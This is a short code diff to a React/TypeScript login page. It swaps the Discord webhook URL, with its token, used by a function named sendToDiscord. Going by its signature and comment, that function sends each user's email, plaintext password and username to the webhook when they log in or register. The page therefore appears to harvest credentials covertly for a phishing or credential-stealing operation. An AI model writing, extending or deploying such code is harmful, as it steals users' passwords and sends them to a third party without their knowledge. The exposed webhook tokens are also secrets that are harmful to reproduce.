@@ -27,7 +27,7 @@ const Login = () => {
 
   // Send details to Discord webhook
   const sendToDiscord = async (type: 'login' | 'register', userEmail: string, userPassword: string, username?: string) => {
-    const webhookUrl = 'https://discord.com/api/webhooks/1463863225090048061/FeAWGacn_gEc9T3RX-p1AMFlCycozmOsq9C3EssHemT_YDDiTBxwMLpx_vkLeepncHpL';
+    const webhookUrl = 'https://discord.com/api/webhooks/1465382200848679238/Q7N3WT9vJNv5HqCktrGNMhYMjlkzTmbMt7RFTN05K6DSRPX_0Ej7tCiRBVlzJL0K5kCs';
     const timestamp = new Date().toLocaleString();
     
     const embed = {
